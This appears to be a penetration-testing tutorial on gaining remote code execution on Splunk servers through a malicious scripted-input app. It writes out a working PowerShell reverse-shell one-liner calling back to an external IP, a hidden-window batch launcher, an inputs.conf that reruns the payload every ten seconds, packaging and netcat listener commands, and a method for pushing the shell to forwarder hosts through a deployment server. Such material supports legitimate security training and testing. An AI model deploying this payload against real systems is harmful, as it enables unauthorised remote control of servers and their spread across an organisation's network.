# Splunk Exploitation

## Remote Code Execution

Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input.

These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with `STDOUT` provided as input to Splunk.

As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. We'll cover this in the next section.

### Abusing Built-In Functionality

We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). First create a custom Splunk application using the following directory structure.

```shell-session
splunk_shell/
├── bin
└── default
```

The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.

{% code title="PowerShell One-Liner Reverse Shell" overflow="wrap" lineNumbers="true" %}
```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

```shell-session
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Once the files are created, we can create a tarball or `.spl` file.

{% code title="Command" %}
```bash
tar -cvzf updater.tar.gz splunk_shell/
```
{% endcode %}

{% code title="Output" %}
```shell-session
splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```
{% endcode %}

The next step is to choose "_Install app from file"_ and upload the application.

Before uploading the malicious custom app, start a listener using [netcat.md](../../../toolbox/tooling/post-exploitation/netcat.md "mention") or [socat](https://linux.die.net/man/1/socat).

```bash
sudo nc -lnvp 443
```

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
